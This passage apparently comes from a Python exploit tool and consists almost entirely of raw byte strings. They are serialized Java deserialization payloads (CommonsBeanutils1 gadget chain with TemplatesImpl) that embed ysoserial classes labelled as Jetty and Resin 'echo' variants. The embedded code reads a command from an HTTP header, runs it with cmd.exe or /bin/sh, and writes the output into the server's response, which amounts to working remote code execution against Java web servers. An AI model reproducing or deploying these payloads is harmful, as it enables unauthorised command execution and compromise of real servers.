\x00\xc1\x08\x00\xc2\n\x00\x1b\x00\xc3\n\x00\x1b\x00\xc4\x08\x00\xc5\x07\x00e\n\x00\x1b\x00\xc6\x08\x00\xc7\x07\x00\xc8\x08\x00\xc9\x08\x00\xca\x07\x00\xcb\n\x00C\x00\xcc\x07\x00\xcd\x07\x00\xce\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x1aLysoserial/MyClassLoader2;\x01\x00\ttransform\x01\x00r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08document\x01\x00-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;\x01\x00\x08handlers\x01\x00B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nExceptions\x07\x00\xcf\x01\x00\xa6(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08iterator\x01\x005Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;\x01\x00\x07handler\x01\x00ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\x08<clinit>\x01\x00\x01e\x01\x00 Ljava/lang/NoSuchFieldException;\x01\x00\x03cls\x01\x00\x11Ljava/lang/Class;\x01\x00\x04var5\x01\x00!Ljava/lang/NoSuchMethodException;\x01\x00\x04cmds\x01\x00\x13[Ljava/lang/String;\x01\x00\x06result\x01\x00\x02[B\x01\x00\tprocessor\x01\x00\x12Ljava/lang/Object;\x01\x00\x03req\x01\x00\x04resp\x01\x00\x01j\x01\x00\x01I\x01\x00\x01t\x01\x00\x12Ljava/lang/Thread;\x01\x00\x03str\x01\x00\x12Ljava/lang/String;\x01\x00\x03obj\x01\x00\nprocessors\x01\x00\x10Ljava/util/List;\x01\x00\x15Ljava/lang/Exception;\x01\x00\x01i\x01\x00\x04flag\x01\x00\x01Z\x01\x00\x05group\x01\x00\x17Ljava/lang/ThreadGroup;\x01\x00\x01f\x01\x00\x19Ljava/lang/reflect/Field;\x01\x00\x07threads\x01\x00\x13[Ljava/lang/Thread;\x01\x00\rStackMapTable\x07\x00\xd0\x07\x00\xd1\x07\x00\xd2\x07\x00\xa7\x07\x00\xa3\x07\x00\x9a\x07\x00\x9d\x07\x00c\x07\x00\xc8\x07\x00\xcb\x01\x00\nSourceFile\x01\x00\x13MyClassLoader2.java\x0c\x00G\x00H\x07\x00\xd2\x0c\x00\xd3\x00\xd4\x0c\x00\xd5\x00\xd6\x0c\x00\xd7\x00\xd8\x0c\x00\xd9\x00\xda\x07\x00\xd1\x0c\x00\xdb\x00\xdc\x0c\x00\xdd\x00\xde\x0c\x00\xdf\x00\xe0\x01\x00\x04exec\x0c\x00\xe1\x00\xe2\x01\x00\x04http\x01\x00\x06target\x01\x00\x12java/lang/Runnable\x01\x00\x06this$0\x01\x00\x1ejava/lang/NoSuchFieldException\x0c\x00\xe3\x00\xd8\x01\x00\x06global\x01\x00\x0ejava/util/List\x0c\x00\xe4\x00\xe5\x0c\x00\xdd\x00\xe6\x01\x00\x0bgetResponse\x01\x00\x0fjava/lang/Class\x0c\x00\xe7\x00\xe8\x01\x00\x10java/lang/Object\x07\x00\xe9\x0c\x00\xea\x00\xeb\x01\x00\tgetHeader\x01\x00\x10java/lang/String\x01\x00\x03cmd\x0c\x00\xec\x00\xed\x01\x00\tsetStatus\x0c\x00\xee\x00_\x01\x00\x11java/lang/Integer\x0c\x00G\x00\xef\x01\x00\x07os.name\x07\x00\xf0\x0c\x00\xf1\x00\xf2\x0c\x00\xf3\x00\xe0\x01\x00\x06window\x01\x00\x07cmd.exe\x01\x00\x02/c\x01\x00\x07/bin/sh\x01\x00\x02-c\x01\x00\x11java/util/Scanner\x01\x00\x18java/lang/ProcessBuilder\x0c\x00G\x00\xf4\x0c\x00\xf5\x00\xf6\x07\x00\xf7\x0c\x00\xf8\x00\xf9\x0c\x00G\x00\xfa\x01\x00\x02\\A\x0c\x00\xfb\x00\xfc\x0c\x00\xfd\x00\xe0\x0c\x00\xfe\x00\xff\x01\x00$org.apache.tomcat.util.buf.ByteChunk\x0c\x01\x00\x01\x01\x0c\x01\x02\x01\x03\x01\x00\x08setBytes\x0c\x01\x04\x00\xe8\x01\x00\x07doWrite\x01\x00\x1fjava/lang/NoSuchMethodException\x01\x00\x13java.nio.ByteBuffer\x01\x00\x04wrap\x01\x00\x13java/lang/Exception\x0c\x01\x05\x00H\x01\x00\x18ysoserial/MyClassLoader2\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x01\x009com/sun/org/apache/xalan/internal/xsltc/TransletException\x01\x00\x15java/lang/ThreadGroup\x01\x00\x17java/lang/reflect/Field\x01\x00\x10java/lang/Thread\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x01\x00\x07getName\x01\x00\x14()Ljava/lang/String;\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x01\x00\rgetSuperclass\x01\x00\x04size\x01\x00\x03()I\x01\x00\x15(I)Ljava/lang/Object;\x01\x00\tgetMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x01\x00\x18java/lang/reflect/Method\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x01\x00\x07isEmpty\x01\x00\x03()Z\x01\x00\x04TYPE\x01\x00\x04(I)V\x01\x00\x10java/lang/System\x01\x00\x0bgetProperty\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x01\x00\x0btoLowerCase\x01\x00\x16([Ljava/lang/String;)V\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x01\x00\x11java/lang/Process\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x01\x00\x18(Ljava/io/InputStream;)V\x01\x00\x0cuseDelimiter\x01\x00\'(Ljava/lang/String;)Ljava/util/Scanner;\x01\x00\x04next\x01\x00\x08getBytes\x01\x00\x04()[B\x01\x00\x07forName\x01\x00%(Ljava/lang/String;)Ljava/lang/Class;\x01\x00\x0bnewInstance\x01\x00\x14()Ljava/lang/Object;\x01\x00\x11getDeclaredMethod\x01\x00\x0fprintStackTrace\x00!\x00E\x00F\x00\x00\x00\x00\x00\x04\x00\x01\x00G\x00H\x00\x01\x00I\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00J\x00\x00\x00\x06\x00\x01\x00\x00\x00\x0c\x00K\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00L\x00M\x00\x00\x00\x01\x00N\x00O\x00\x02\x00I\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00J\x00\x00\x00\x06\x00\x01\x00\x00\x00]\x00K\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00L\x00M\x00\x00\x00\x00\x00\x01\x00P\x00Q\x00\x01\x00\x00\x00\x01\x00R\x00S\x00\x02\x00T\x00\x00\x00\x04\x00\x01\x00U\x00\x01\x00N\x00V\x00\x02\x00I\x00\x00\x00I\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00J\x00\x00\x00\x06\x00\x01\x00\x00\x00b\x00K\x00\x00\x00*\x00\x04\x00\x00\x00\x01\x00L\x00M\x00\x00\x00\x00\x00\x01\x00P\x00Q\x00\x01\x00\x00\x00\x01\x00W\x00X\x00\x02\x00\x00\x00\x01\x00Y\x00Z\x00\x03\x00T\x00\x00\x00\x04\x00\x01\x00U\x00\x08\x00[\x00H\x00\x01\x00I\x00\x00\x05\xe7\x00\x08\x00\x11\x00\x00\x03\x01\x03;\xb8\x00\x02\xb6\x00\x03L+\xb6\x00\x04\x12\x05\xb6\x00\x06M,\x04\xb6\x00\x07,+\xb6\x00\x08\xc0\x00\t\xc0\x00\tN\x036\x04\x15\x04-\xbe\xa2\x02\xcd-\x15\x042:\x05\x19\x05\xc7\x00\x06\xa7\x02\xb9\x19\x05\xb6\x00\n:\x06\x19\x06\x12\x0b\xb6\x00\x0c\x9a\x00\r\x19\x06\x12\r\xb6\x00\x0c\x9a\x00\x06\xa7\x02\x9b\x19\x05\xb6\x00\x04\x12\x0e\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x05\xb6\x00\x08:\x07\x19\x07\xc1\x00\x0f\x9a\x00\x06\xa7\x02x\x19\x07\xb6\x00\x04\x12\x10\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x07\x19\x07\xb6\x00\x04\x12\x11\xb6\x00\x06M\xa7\x00\x16:\x08\x19\x07\xb6\x00\x04\xb6\x00\x13\xb6\x00\x13\x12\x11\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x07\x19\x07\xb6\x00\x04\xb6\x00\x13\x12\x14\xb6\x00\x06M\xa7\x00\x10:\x08\x19\x07\xb6\x00\x04\x12\x14\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08:\x07\x19\x07\xb6\x00\x04\x12\x15\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\x07\xb6\x00\x08\xc0\x00\x16\xc0\x00\x16:\x08\x036\t\x15\t\x19\x08\xb9\x00\x17\x01\x00\xa2\x01\xcb\x19\x08\x15\t\xb9\x00\x18\x02\x00:\n\x19\n\xb6\x00\x04\x12\x19\xb6\x00\x06M,\x04\xb6\x00\x07,\x19\n\xb6\x00\x08:\x0b\x19\x0b\xb6\x00\x04\x12\x1a\x03\xbd\x00\x1b\xb6\x00\x1c\x19\x0b\x03\xbd\x00\x1d\xb6\x00\x1e:\x0c\x19\x0b\xb6\x00\x04\x12\x1f\x04\xbd\x00\x1bY\x03\x12 S\xb6\x00\x1c\x19\x0b\x04\xbd\x00\x1dY\x03\x12!S\xb6\x00\x1e\xc0\x00 :\x06\x19\x06\xc6\x01W\x19\x06\xb6\x00"\x9a\x01O\x19\x0c\xb6\x00\x04\x12#\x04\xbd\x00\x1bY\x03\xb2\x00$S\xb6\x00\x1c\x19\x0c\x04\xbd\x00\x1dY\x03\xbb\x00%Y\x11\x00\xc8\xb7\x00&S\xb6\x00\x1eW\x12\'\xb8\x00(\xb6\x00)\x12*\xb6\x00\x0c\x99\x00\x19\x06\xbd\x00 Y\x03\x12+SY\x04\x12,SY\x05\x19\x06S\xa7\x00\x16\x06\xbd\x00 Y\x03\x12-SY\x04\x12.SY\x05\x19\x06S:\r\xbb\x00/Y\xbb\x000Y\x19\r\xb7\x001\xb6\x002\xb6\x003\xb7\x004\x125\xb6\x006\xb6\x007\xb6\x008:\x0e\x129\xb8\x00::\x0f\x19\x0f\xb6\x00;:\x07\x19\x0f\x12<\x06\xbd\x00\x1bY\x03\x12=SY\x04\xb2\x00$SY\x05\xb2\x00$S\xb6\x00>\x19\x07\x06\xbd\x00\x1dY\x03\x19\x0eSY\x04\xbb\x00%Y\x03\xb7\x00&SY\x05\xbb\x00%Y\x19\x0e\xbe\xb7\x00&S\xb6\x00\x1eW\x19\x0c\xb6\x00\x04\x12?\x04\xbd\x00\x1bY\x03\x19\x0fS\xb6\x00\x1c\x19\x0c\x04\xbd\x00\x1dY\x03\x19\x07S\xb6\x00\x1eW\xa7\x00N:\x0f\x12A\xb8\x00::\x10\x19\x10\x12B\x04\xbd\x00\x1bY\x03\x12=S\xb6\x00>\x19\x10\x04\xbd\x00\x1dY\x03\x19\x0eS\xb6\x00\x1e:\x07\x19\x0c\xb6\x00\x04\x12?\x04\xbd\x00\x1bY\x03\x19\x10S\xb6\x00\x1c\x19\x0c\x04\xbd\x00\x1dY\x03\x19\x07S\xb6\x00\x1eW\x04;\x1a\x99\x00\x06\xa7\x00\t\x84\t\x01\xa7\xfe/\x1a\x99\x00\x06\xa7\x00\x11\xa7\x00\x08:\x05\xa7\x00\x03\x84\x04\x01\xa7\xfd2\xa7\x00\x08K*\xb6\x00D\xb1\x00\x08\x00\x95\x00\xa0\x00\xa3\x00\x12\x00\xc3\x00\xd1\x00\xd4\x00\x12\x02\x13\x02\x86\x02\x89\x00@\x00.\x009\x02\xed\x00C\x00<\x00W\x02\xed\x00C\x00Z\x00z\x02\xed\x00C\x00}\x02\xe7\x02\xed\x00C\x00\x00\x02\xf8\x02\xfb\x00C\x00\x03\x00J\x00\x00\x01\x02\x00@\x00\x00\x00\x11\x00\x02\x00\x12\x00\t\x00\x13\x00\x13\x00\x14\x00\x18\x00\x15\x00$\x00\x16\x00.\x00\x18\x004\x00\x19\x00<\x00\x1a\x00C\x00\x1b\x00Z\x00\x1c\x00e\x00\x1d\x00j\x00\x1e\x00r\x00\x1f\x00}\x00 \x00\x88\x00!\x00\x8d\x00"\x00\x95\x00$\x00\xa0\x00\'\x00\xa3\x00%\x00\xa5\x00&\x00\xb6\x00(\x00\xbb\x00)\x00\xc3\x00+\x00\xd1\x00.\x00\xd4\x00,\x00\xd6\x00-\x00\xe1\x00/\x00\xe6\x000\x00\xee\x001\x00\xf9\x002\x00\xfe\x003\x01\x0c\x004\x01\x1b\x005\x01&\x006\x011\x007\x016\x008\x01>\x009\x01W\x00:\x01}\x00;\x01\x8a\x00<\x01\xb5\x00=\x01\xf0\x00>\x02\x13\x00@\x02\x1a\x00A\x02!\x00B\x02d\x00C\x02\x86\x00H\x02\x89\x00D\x02\x8b\x00E\x02\x92\x00F\x02\xb2\x00G\x02\xd4\x00I\x02\xd6\x00K\x02\xdd\x004\x02\xe3\x00M\x02\xea\x00P\x02\xed\x00N\x02\xef\x00O\x02\xf2\x00\x16\x02\xf8\x00W\x02\xfb\x00U\x02\xfc\x00V\x03\x00\x00X\x00K\x00\x00\x00\xde\x00\x16\x00\xa5\x00\x11\x00\\\x00]\x00\x08\x00\xd6\x00\x0b\x00\\\x00]\x00\x08\x02\x1a\x00l\x00^\x00_\x00\x0f\x02\x92\x00B\x00^\x00_\x00\x10\x02\x8b\x00I\x00`\x00a\x00\x0f\x01\xf0\x00\xe6\x00b\x00c\x00\r\x02\x13\x00\xc3\x00d\x00e\x00\x0e\x01&\x01\xb7\x00f\x00g\x00\n\x01>\x01\x9f\x00h\x00g\x00\x0b\x01W\x01\x86\x00i\x00g\x00\x0c\x01\x0f\x01\xd4\x00j\x00k\x00\t\x004\x02\xb6\x00l\x00m\x00\x05\x00C\x02\xa7\x00n\x00o\x00\x06\x00r\x02x\x00p\x00g\x00\x07\x01\x0c\x01\xde\x00q\x00r\x00\x08\x02\xef\x00\x03\x00\\\x00s\x00\x05\x00\'\x02\xd1\x00t\x00k\x00\x04\x00\x02\x02\xf6\x00u\x00v\x00\x00\x00\t\x02\xef\x00w\x00x\x00\x01\x00\x13\x02\xe5\x00y\x00z\x00\x02\x00$\x02\xd4\x00{\x00|\x00\x03\x02\xfc\x00\x04\x00\\\x00s\x00\x00\x00}\x00\x00\x00\xa8\x00\x17\xff\x00\'\x00\x05\x01\x07\x00~\x07\x00\x7f\x07\x00\t\x01\x00\x00\xfc\x00\x14\x07\x00\x80\xfc\x00\x1a\x07\x00\x81\x02\xfc\x00"\x07\x00\x82e\x07\x00\x83\x12]\x07\x00\x83\x0c\xfd\x00-\x07\x00\x84\x01\xfe\x00\xcb\x07\x00\x82\x07\x00\x82\x07\x00\x82R\x07\x00\x85\xff\x00\x9a\x00\x0f\x01\x07\x00~\x07\x00\x7f\x07\x00\t\x01\x07\x00\x80\x07\x00\x81\x07\x00\x82\x07\x00\x84\x01\x07\x00\x82\x07\x00\x82\x07\x00\x82\x07\x00\x85\x07\x00=\x00\x01\x07\x00\x86\xfb\x00J\xf9\x00\x01\xf8\x00\x06\xfa\x00\x05\xff\x00\x06\x00\x05\x01\x07\x00~\x07\x00\x7f\x07\x00\t\x01\x00\x00B\x07\x00\x87\x04\xff\x00\x05\x00\x00\x00\x00B\x07\x00\x87\x04\x00\x01\x00\x88\x00\x00\x00\x02\x00\x89pt\x00\x04pwnrpw\x01\x00xq\x00~\x00\x0ex'

        # CommonsBeanutils1(Jetty回显)
        __bb_CommonsBeanutils1_jetty_echo = b''


        # CommonsBeanutils1(Resin回显)
        # tested on resin4.0.60, 4.0.65
        __bb_CommonsBeanutils1_resin_echo = b'\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator\xe3\xa1\x88\xeas"\xa4H\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00?org.apache.commons.collections.comparators.ComparableComparator\xfb\xf4\x99%\xb8n\xb17\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\tI\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x19_accessExternalStylesheetq\x00~\x00\x04L\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xff\x00t\x00\x03allpur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x0f\xd7\xca\xfe\xba\xbe\x00\x00\x003\x00\xce\n\x00,\x00g\n\x00h\x00i\n\x00j\x00k\n\x00l\x00m\x08\x00n\n\x00l\x00o\n\x00p\x00q\n\x00p\x00r\x08\x00s\x07\x00X\x08\x00t\n\x00l\x00u\x08\x00v\n\x00w\x00x\x07\x00y\x08\x00D\n\x00\x0f\x00z\x08\x00{\x08\x00|\n\x00\x0f\x00}\x08\x00~\n\x00l\x00\x7f\n\x00\x80\x00q\n\x00\x80\x00\x81\x07\x00\x82\n\x00w\x00\x83\n\x00w\x00\x84\n\x00w\x00\x85\n\x00\x19\x00\x86\x08\x00\x87\n\x00\x19\x00\x88\x07\x00\x89\n\x00\x8a\x00\x8b\n\x00\x8a\x00\x8c\n\x00\x8d\x00\x8e\n\x00 \x00\x8f\x08\x00\x90\n\x00 \x00\x91\n\x00 \x00\x92\n\x00\x19\x00\x93\x07\x00\x94\n\x00)\x00\x95\x07\x00\x96\x07\x00\x97\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x1aLysoserial/MyClassLoader4;\x01\x00\ttransform\x01\x00r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08document\x01\x00-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;\x01\x00\x08handlers\x01\x00B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nExceptions\x07\x00\x98\x01\x00\xa6(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08iterator\x01\x005Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;\x01\x00\x07handler\x01\x00ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\x08<clinit>\x01\x00\x0bhttpRequest\x01\x00$Lcom/caucho/server/http/HttpRequest;\x01\x00\x03cmd\x01\x00\x12Ljava/lang/String;\x01\x00\x08testecho\x01\x00\x03res\x01\x00\x0chttpResponse\x01\x00%Lcom/caucho/server/http/HttpResponse;\x01\x00\x06method\x01\x00\x1aLjava/lang/reflect/Method;\x01\x00\x12httpResponseStream\x01\x00+Lcom/caucho/server/http/HttpResponseStream;\x01\x00\x01o\x01\x00\x12Ljava/lang/Object;\x01\x00\x01i\x01\x00\x01I\x01\x00\x05clazz\x01\x00\x11Ljava/lang/Class;\x01\x00\x05field\x01\x00\x19Ljava/lang/reflect/Field;\x01\x00\x03obj\x01\x00\x07obj_arr\x01\x00\x13[Ljava/lang/Object;\x01\x00\x01e\x01\x00\x15Ljava/lang/Exception;\x01\x00\rStackMapTable\x07\x00\x99\x07\x00\x9a\x07\x00\x9b\x07\x00y\x07\x00\x9c\x07\x00\x9d\x07\x00\x9e\x07\x00\x82\x07\x00\x94\x01\x00\nSourceFile\x01\x00\x13MyClassLoader4.java\x0c\x00-\x00.\x07\x00\x9f\x0c\x00\xa0\x00\xa1\x07\x00\x9b\x0c\x00\xa2\x00\xa3\x07\x00\x99\x0c\x00\xa4\x00\xa3\x01\x00\x0cthreadLocals\x0c\x00\xa5\x00\xa6\x07\x00\x9a\x0c\x00\xa7\x00\xa8\x0c\x00\xa9\x00\xaa\x01\x00\x05table\x01\x00\x05value\x0c\x00\xab\x00\xac\x01\x00"com.caucho.server.http.HttpRequest\x07\x00\x9c\x0c\x00\xad\x00\xae\x01\x00"com/caucho/server/http/HttpRequest\x0c\x00\xaf\x00\xb0\x01\x00\x08Testecho\x01\x00\x00\x0c\x00\xb1\x00\xb2\x01\x00\x14createResponseStream\x0c\x00\xb3\x00\xb4\x07\x00\x9e\x0c\x00\xb5\x00\xb6\x01\x00)com/caucho/server/http/HttpResponseStream\x0c\x00\xb7\x00\xb8\x0c\x00\xb9\x00\xba\x0c\x00\xbb\x00\xbc\x0c\x00\xbd\x00\xbe\x01\x00\x02\n\n\x0c\x00\xbd\x00\xbf\x01\x00\x11java/util/Scanner\x07\x00\xc0\x0c\x00\xc1\x00\xc2\x0c\x00\xc3\x00\xc4\x07\x00\xc5\x0c\x00\xc6\x00\xc7\x0c\x00-\x00\xc8\x01\x00\x02\\A\x0c\x00\xc9\x00\xca\x0c\x00\xcb\x00\xac\x0c\x00\xcc\x00.\x01\x00\x13java/lang/Exception\x0c\x00\xcd\x00.\x01\x00\x18ysoserial/MyClassLoader4\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x01\x009com/sun/org/apache/xalan/internal/xsltc/TransletException\x01\x00\x0fjava/lang/Class\x01\x00\x17java/lang/reflect/Field\x01\x00\x10java/lang/Object\x01\x00\x10java/lang/String\x01\x00#com/caucho/server/http/HttpResponse\x01\x00\x18java/lang/reflect/Method\x01\x00\x10java/lang/Thread\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x01\x00\rgetSuperclass\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x01\x00\x07getName\x01\x00\x14()Ljava/lang/String;\x01\x00\x06equals\x01\x00\x15(Ljava/lang/Object;)Z\x01\x00\tgetHeader\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x01\x00\x0ecreateResponse\x01\x00\'()Lcom/caucho/server/http/HttpResponse;\x01\x00\x11getDeclaredMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x01\x00\x07isEmpty\x01\x00\x03()Z\x01\x00\x08getBytes\x01\x00\x04()[B\x01\x00\x06length\x01\x00\x03()I\x01\x00\x05write\x01\x00\x07([BII)V\x01\x00\x05([B)V\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x01\x00\x04exec\x01\x00\'(Ljava/lang/String;)Ljava/lang/Process;\x01\x00\x11java/lang/Process\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x01\x00\x18(Ljava/io/InputStream;)V\x01\x00\x0cuseDelimiter\x01\x00\'(Ljava/lang/String;)Ljava/util/Scanner;\x01\x00\x04next\x01\x00\x05close\x01\x00\x0fprintStackTrace\x00!\x00+\x00,\x00\x00\x00\x00\x00\x04\x00\x01\x00-\x00.\x00\x01\x00/\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x000\x00\x00\x00\x06\x00\x01\x00\x00\x00\x0b\x001\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x002\x003\x00\x00\x00\x01\x004\x005\x00\x02\x00/\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x000\x00\x00\x00\x06\x00\x01\x00\x00\x00H\x001\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x002\x003\x00\x00\x00\x00\x00\x01\x006\x007\x00\x01\x00\x00\x00\x01\x008\x009\x00\x02\x00:\x00\x00\x00\x04\x00\x01\x00;\x00\x01\x004\x00<\x00\x02\x00/\x00\x00\x00I\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x000\x00\x00\x00\x06\x00\x01\x00\x00\x00M\x001\x00\x00\x00*\x00\x04\x00\x00\x00\x01\x002\x003\x00\x00\x00\x00\x00\x01\x006\x007\x00\x01\x00\x00\x00\x01\x00=\x00>\x00\x02\x00\x00\x00\x01\x00?\x00@\x00\x03\x00:\x00\x00\x00\x04\x00\x01\x00;\x00\x08\x00A\x00.\x00\x01\x00/\x00\x00\x02\xe6\x00\x04\x00\r\x00\x00\x017\xb8\x00\x02\xb6\x00\x03K*\xb6\x00\x04\x12\x05\xb6\x00\x06L+\x04\xb6\x00\x07+\xb8\x00\x02\xb6\x00\x08M,\xb6\x00\x03\x12\t\xb6\x00\x06L+\x04\xb6\x00\x07+,\xb6\x00\x08M,\xc0\x00\n\xc0\x00\nN\x036\x04\x15\x04-\xbe\xa2\x00\xec-\x15\x042:\x05\x19\x05\xc7\x00\x06\xa7\x00\xd8\x19\x05\xb6\x00\x03\x12\x0b\xb6\x00\x06L+\x04\xb6\x00\x07+\x19\x05\xb6\x00\x08M,\xc6\x00\xbd,\xb6\x00\x03\xb6\x00\x0c\x12\r\xb6\x00\x0e\x99\x00\xae,\xc0\x00\x0f:\x06\x19\x06\x12\x10\xb6\x00\x11:\x07\x19\x06\x12\x12\xb6\x00\x11:\x08\x12\x13:\t\x19\x06\xb6\x00\x14:\n\x19\n\xb6\x00\x03\x12\x15\x01\xb6\x00\x16:\x0b\x19\x0b\x04\xb6\x00\x17\x19\x0b\x19\n\x01\xb6\x00\x18\xc0\x00\x19:\x0c\x19\x08\xc6\x00%\x19\x08\xb6\x00\x1a\x9a\x00\x1d\x19\x0c\x19\x08\xb6\x00\x1b\x03\x19\x08\xb6\x00\x1c\xb6\x00\x1d\x19\x0c\x12\x1e\xb6\x00\x1b\xb6\x00\x1f\x19\x07\xc6\x007\x19\x07\xb6\x00\x1a\x9a\x00/\xbb\x00 Y\xb8\x00!\x19\x07\xb6\x00"\xb6\x00#\xb7\x00$\x12%\xb6\x00&\xb6\x00\':\t\x19\x0c\x19\t\xb6\x00\x1b\x03\x19\t\xb6\x00\x1c\xb6\x00\x1d\x19\x0c\xb6\x00(\xa7\x00\t\x84\x04\x01\xa7\xff\x13\xa7\x00\x08K*\xb6\x00*\xb1\x00\x01\x00\x00\x01.\x011\x00)\x00\x03\x000\x00\x00\x00\x92\x00$\x00\x00\x00\x0f\x00\x07\x00\x10\x00\x11\x00\x11\x00\x16\x00\x12\x00\x1e\x00\x13\x00(\x00\x14\x00-\x00\x15\x003\x00\x16\x00;\x00\x17\x00E\x00\x18\x00K\x00\x19\x00S\x00\x1a\x00^\x00\x1b\x00c\x00\x1c\x00j\x00\x1d\x00}\x00\x1f\x00\x83\x00 \x00\x8c\x00!\x00\x95\x00#\x00\x99\x00&\x00\xa0\x00(\x00\xad\x00)\x00\xb3\x00*\x00\xc0\x00-\x00\xcd\x00.\x00\xdd\x00/\x00\xe7\x003\x00\xf4\x004\x01\x10\x005\x01 